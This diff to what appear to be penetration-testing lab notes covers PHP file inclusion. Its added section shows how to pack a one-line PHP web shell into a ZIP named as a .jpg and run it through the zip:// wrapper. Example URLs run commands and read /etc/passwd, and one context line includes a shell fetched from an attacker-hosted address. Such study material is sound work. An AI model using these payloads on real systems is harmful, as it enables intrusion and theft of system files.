@@ -421,6 +421,8 @@ http://10.129.29.114/index.php?language=http://10.10.14.172:8001/shell.php&cmd=c
 
 ![Filtered output](images/basic-rfi.png)
 
+---
+
 ## File Uploads
 
 File upload functionality is a common feature in modern web applications. Being able to store files on the back-end server can be very beneficial for an attacker, as these files may later be leveraged through an LFI vulnerability.
@@ -449,4 +451,38 @@ With the path known, the file can be included via the LFI vulnerability and comm
 
 ```bash
 http://94.237.55.43:48679/index.php?language=./profile_images/shell.gif&cmd=id
+```
+
+---
+
+### Zip Upload
+
+The PHP **zip wrapper** (`zip://`) can be used to include and execute PHP code stored inside a ZIP archive. This technique requires PHP to be compiled with ZIP support and the ZIP extension to be enabled (which is common, but not guaranteed).
+
+As with other file inclusion techniques, code execution only occurs when the application includes the file using a PHP include function.
+
+**Step 1:**
+
+Create a PHP web shell and place it inside a ZIP archive with an allowed file extension:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+**Step 2:**
+
+Upload the ZIP file and include the embedded PHP file via the zip wrapper. Files inside a ZIP archive are referenced using the following syntax:
+
+```bash
+zip://<path_to_zip>%23<file_inside_zip>
+```
+
+The # character must be URL encoded as %23.
+
+```bash
+http://94.237.55.43:48679/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+```bash
+http://94.237.61.242:42157/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=cd+../../../;cat+/etc/passwd
 ```
